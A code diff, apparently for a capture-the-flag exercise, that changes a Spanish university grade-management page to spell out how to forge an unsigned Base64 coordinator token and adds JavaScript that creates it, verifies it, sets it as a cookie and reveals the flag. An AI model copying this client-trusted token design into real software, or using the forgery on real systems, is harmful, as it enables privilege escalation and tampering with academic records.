@@ -46,10 +46,16 @@
           <h2>Revisiones de Notas</h2>
 
           <div class="info-box">
-            <p>⚠️ Acceso limitado detectado</p>
-            <p>Algunas funciones requieren token de coordinador</p>
-            <p class="hint-text">
-              Sugerencia: Los tokens pueden estar en formato Base64
+            <p><strong>Acceso limitado detectado</strong></p>
+            <p>Para modificar estados academicos (ej. <code>/api/academic/update</code>) no puedes hacerlo directamente. Debes cumplir estos requisitos:</p>
+            <ul style="text-align: left; margin: 15px 0; padding-left: 25px;">
+              <li><strong>Sesion activa:</strong> Tienes que estar logueado. La cookie <code>session_data</code> debe tener tu <code>user_id</code>.</li>
+              <li><strong>Token de coordinador:</strong> Necesitas un token valido de coordinador sin restricciones y guardarlo como cookie <code>access_token</code>.</li>
+              <li><strong>Obtener el token:</strong> El endpoint de verificacion es <code>POST /api/verify-token</code>. Envia el token en el header <code>Authorization: Bearer &lt;token&gt;</code>. El token debe ser Base64 de un JSON con <code>role: "coordinator"</code> y <code>limited: false</code>.</li>
+              <li>En esta pagina (panel de monitor) puedes encontrar en el codigo fuente una forma de generar y verificar ese token. Revisa el HTML y el JavaScript.</li>
+            </ul>
+            <p class="hint-text" style="margin-top: 10px;">
+              Resumen: inicia sesion, llega a este panel, obten el token (revisa el codigo fuente), guardalo como cookie <code>access_token</code>, y entonces las peticiones a <code>/api/academic/update</code> con tu sesion activa funcionaran.
             </p>
           </div>
 
@@ -85,12 +91,24 @@
               Solicitar Acceso Completo
             </button>
           </div>
+
+          <!-- 
+            BOTÓN OCULTO: Crear y verificar token de coordinador completo
+            Descomenta este bloque y ejecuta la función para obtener el token correcto
+            y ver la respuesta completa del servidor (incluye la flag).
+            
+            <div class="action-section" style="margin-top: 20px;">
+              <button onclick="createAndVerifyCoordinatorToken()" class="btn btn-secondary">
+                Generar Token de Coordinador
+              </button>
+            </div>
+          -->
         </div>
       </div>
 
       <!-- Footer -->
       <footer class="footer">
-        <p>Universidad de Medellín - Sistema de Gestión Académica</p>
+        <p>Universidad de Mellín - Sistema de Gestión Académica</p>
       </footer>
     </div>
 
@@ -137,6 +155,48 @@
       console.log(
         "Tip: Los tokens Base64 se pueden decodificar y modificar en DevTools",
       );
+      console.log("Hint: Revisa el código fuente HTML de esta página para encontrar más herramientas");
+
+      // Crear y verificar token de coordinador completo (descomenta el botón en el HTML para usarlo)
+      function createAndVerifyCoordinatorToken() {
+        const tokenData = {
+          role: 'coordinator',
+          limited: false
+        };
+        const token = btoa(JSON.stringify(tokenData));
+        console.log('Token creado:', token);
+        console.log('Token decodificado:', atob(token));
+        fetch('/api/verify-token', {
+          method: 'POST',
+          headers: {
+            'Authorization': 'Bearer ' + token
+          }
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log('Respuesta del servidor:', data);
+          alert('Token verificado exitosamente!\n\nRespuesta del servidor:\n' +
+                JSON.stringify(data, null, 2) +
+                '\n\nFlag encontrada: ' + (data.flag || 'No disponible'));
+          // Guardar token como cookie (con path y sin expiración)
+          document.cookie = 'access_token=' + token + '; path=/';
+          console.log('Token guardado como cookie. Redirigiendo al panel académico...');
+          // Redirigir automáticamente después de un breve delay
+          setTimeout(function() {
+            window.location.href = '/academic/management';
+          }, 500);
+        })
+        .catch(error => {
+          console.error('Error al verificar token:', error);
+          alert('Error al verificar el token. Revisa la consola para más detalles.');
+        });
+      }
+      
+      // Función helper para guardar token manualmente desde la consola
+      window.setCoordinatorToken = function(token) {
+        document.cookie = 'access_token=' + token + '; path=/';
+        console.log('Token guardado como cookie. Ahora puedes acceder a /academic/management');
+      };
     </script>
   </body>
 </html>
